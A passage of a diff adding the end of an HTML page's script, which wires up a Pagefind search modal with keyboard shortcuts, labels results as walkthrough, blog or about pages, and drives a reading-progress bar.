+                showImages: false,
+                excerptLength: 30
+            });
+        }
+    }
+
+    function focusSearchInput() {
+        setTimeout(function () {
+            const input = document.querySelector(".pagefind-ui__search-input");
+            if (input) input.focus();
+        }, 150);
+    }
+
+    function addResultMetadata() {
+        document.querySelectorAll(".pagefind-ui__result").forEach(function (result) {
+            if (result.querySelector(".mw-result-meta")) return;
+
+            const link = result.querySelector("a");
+            if (!link) return;
+
+            let type = "Page";
+            const href = link.getAttribute("href") || "";
+
+            if (href.includes("/walkthroughs/")) type = "Walkthrough";
+            if (href.includes("/blog/")) type = "Blog";
+            if (href.includes("/whoami/")) type = "About";
+
+            const meta = document.createElement("div");
+            meta.className = "mw-result-meta";
+            meta.textContent = type;
+
+            const title = result.querySelector(".pagefind-ui__result-title");
+            if (title) title.insertAdjacentElement("afterend", meta);
+        });
+    }
+
+    function openSearch() {
+        modal.style.display = "block";
+        initPagefind();
+        focusSearchInput();
+        setTimeout(addResultMetadata, 300);
+    }
+
+    function closeSearch() {
+        modal.style.display = "none";
+    }
+
+    function updateReadingProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const bar = document.getElementById("mw-reading-progress");
+
+        if (!bar || docHeight <= 0) return;
+
+        const progress = (scrollTop / docHeight) * 100;
+        bar.style.width = progress + "%";
+    }
+
+    document.addEventListener("click", function (e) {
+        if (e.target.closest("#mw-search-button")) openSearch();
+        if (e.target.id === "mw-search-close") closeSearch();
+        if (e.target === modal) closeSearch();
+
+        setTimeout(addResultMetadata, 300);
+    });
+
+    document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape" && modal.style.display === "block") {
+            closeSearch();
+        }
+
+        if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
+            e.preventDefault();
+            modal.style.display === "block" ? closeSearch() : openSearch();
+        }
+
+        setTimeout(addResultMetadata, 300);
+    });
+
+    window.addEventListener("scroll", updateReadingProgress);
+    window.addEventListener("resize", updateReadingProgress);
+
+    initPagefind();
+    updateReadingProgress();
+});
+</script>
+
+
+    </body>
+</html>
